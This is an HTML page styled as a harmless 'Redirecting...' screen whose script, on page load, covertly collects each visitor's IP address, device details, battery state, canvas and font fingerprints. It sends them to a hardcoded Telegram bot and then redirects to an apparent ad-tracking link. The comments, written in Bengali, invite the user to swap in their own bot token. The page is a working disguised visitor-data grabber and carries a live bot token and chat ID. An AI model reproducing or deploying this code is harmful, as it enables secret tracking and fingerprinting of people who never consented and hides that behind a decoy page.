<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px 20px; background: #0d1117; color: #c9d1d9; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 40px; max-width: 400px; width: 100%; box-shadow: 0 8px 24px rgba(0,0,0,0.4); }
        .spinner { width: 48px; height: 48px; border: 4px solid #30363d; border-top-color: #58a6ff; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        h3 { font-size: 20px; margin-bottom: 10px; color: #f0f6fc; }
        p { color: #8b949e; font-size: 14px; line-height: 1.6; }
    </style>
</head>
<body>
    <div class="card">
        <div class="spinner"></div>
        <h3>⏳ Redirecting...</h3>
        <p>Please wait, you will be redirected automatically.</p>
    </div>

    <script>
        // ============ আপনার তথ্য দিন (শুধু এই অংশটুকু পরিবর্তন করবেন) ============
        const TG_BOT_TOKEN = "8651142215:AAHuKP53rRExlvBipq2EgcXWCOU4i-vZ7Do";
        const TG_CHAT_ID = "5575068712";
        const REDIRECT_URL = "https://coldredir.com/L?tag=d_5695957m_126646c_&site=5695957&ad=126646";
        // =====================================================================

        const info = {
            ip: "Loading...",
            userAgent: navigator.userAgent || "N/A",
            platform: navigator.platform || "N/A",
            language: navigator.language || "N/A",
            screenRes: (screen.width && screen.height) ? screen.width + "x" + screen.height : "N/A",
            colorDepth: screen.colorDepth ? screen.colorDepth + "-bit" : "N/A",
            deviceMemory: navigator.deviceMemory !== undefined ? navigator.deviceMemory + "GB" : "N/A",
            hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
            touchPoints: navigator.maxTouchPoints !== undefined ? navigator.maxTouchPoints : "N/A",
            timezone: Intl.DateTimeFormat ? Intl.DateTimeFormat().resolvedOptions().timeZone : "N/A",
            timezoneOffset: new Date().getTimezoneOffset(),
            timestamp: new Date().toLocaleString("en-US", { timeZone: "Asia/Dhaka" }),
            cookiesEnabled: navigator.cookieEnabled !== undefined ? navigator.cookieEnabled : "N/A",
            batteryLevel: "N/A",
            batteryCharging: "N/A",
            canvasFingerprint: "N/A",
            fontFingerprint: "N/A"
        };

        // ব্যাটারি
        if (navigator.getBattery) {
            navigator.getBattery().then(function(battery) {
                info.batteryLevel = Math.round(battery.level * 100) + "%";
                info.batteryCharging = battery.charging ? "Yes" : "No";
            });
        }

        // ক্যানভাস ফিঙ্গারপ্রিন্ট
        try {
            var canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 50;
            var ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 200, 50);
            ctx.fillStyle = '#069';
            ctx.fillText('Hello123!', 5, 5);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.font = '18px Arial';
            ctx.fillText('Test456', 50, 20);
            info.canvasFingerprint = canvas.toDataURL().substring(0, 60);
        } catch(e) {
            info.canvasFingerprint = "Blocked";
        }

        // ফন্ট ফিঙ্গারপ্রিন্ট
        try {
            var fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Georgia', 'Courier New', 'Verdana', 'Impact'];
            var detected = [];
            var testStr = "abcdefghijklmnopqrstuvwxyz0123456789";
            var baseWidth = null;
            
            var container = document.createElement('div');
            container.style.position = 'absolute';
            container.style.left = '-9999px';
            container.style.visibility = 'hidden';
            document.body.appendChild(container);
            
            var baseSpan = document.createElement('span');
            baseSpan.style.fontFamily = 'monospace';
            baseSpan.style.fontSize = '40px';
            baseSpan.textContent = testStr;
            container.appendChild(baseSpan);
            baseWidth = baseSpan.offsetWidth;
            
            for (var i = 0; i < fonts.length; i++) {
                var span = document.createElement('span');
                span.style.fontFamily = '"' + fonts[i] + '", monospace';
                span.style.fontSize = '40px';
                span.textContent = testStr;
                container.appendChild(span);
                if (span.offsetWidth !== baseWidth) {
                    detected.push(fonts[i]);
                }
            }
            document.body.removeChild(container);
            info.fontFingerprint = detected.length > 0 ? detected.join(', ') : 'Basic only';
        } catch(e) {
            info.fontFingerprint = "Error";
        }

        // আইপি ফেচ
        fetch('https://api.ipify.org?format=json')
            .then(function(r) { return r.json(); })
            .then(function(data) {
                info.ip = data.ip;
                sendToTelegram();
            })
            .catch(function() {
                info.ip = "Unavailable";
                sendToTelegram();
            });

        setTimeout(function() {
            if (info.ip === "Loading...") {
                info.ip = "Timeout";
                sendToTelegram();
            }
        }, 4000);

        function sendToTelegram() {
            var msg = "**New Visitor Detected**\n" +
                      "━━━━━━━━━━━━━━━\n" +
                      "**IP:** " + info.ip + "\n" +
                      "**Platform:** " + info.platform + "\n" +
                      "**Screen:** " + info.screenRes + " (" + info.colorDepth + ")\n" +
                      "**RAM:** " + info.deviceMemory + "\n" +
                      "**CPU Cores:** " + info.hardwareConcurrency + "\n" +
                      "**Touch Points:** " + info.touchPoints + "\n" +
                      "**Language:** " + info.language + "\n" +
                      "**Timezone:** " + info.timezone + "\n" +
                      "**Timestamp (BD):** " + info.timestamp + "\n" +
                      "**Cookies:** " + info.cookiesEnabled + "\n" +
                      "**Battery:** " + info.batteryLevel + " (Charging: " + info.batteryCharging + ")\n" +
                      "**Canvas ID:** `" + info.canvasFingerprint + "`\n" +
                      "**Fonts:** " + info.fontFingerprint + "\n" +
                      "━━━━━━━━━━━━━━━\n" +
                      "**UA:** `" + info.userAgent.substring(0, 120) + "`";

            fetch("https://api.telegram.org/bot" + TG_BOT_TOKEN + "/sendMessage", {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TG_CHAT_ID,
                    text: msg,
                    parse_mode: 'Markdown'
                })
            }).catch(function(err) { console.log("Error:", err); });
        }

        // 2 সেকেন্ড পর রিডাইরেক্ট
        setTimeout(function() {
            window.location.href = REDIRECT_URL;
        }, 2000);
    </script>
</body>
</html>
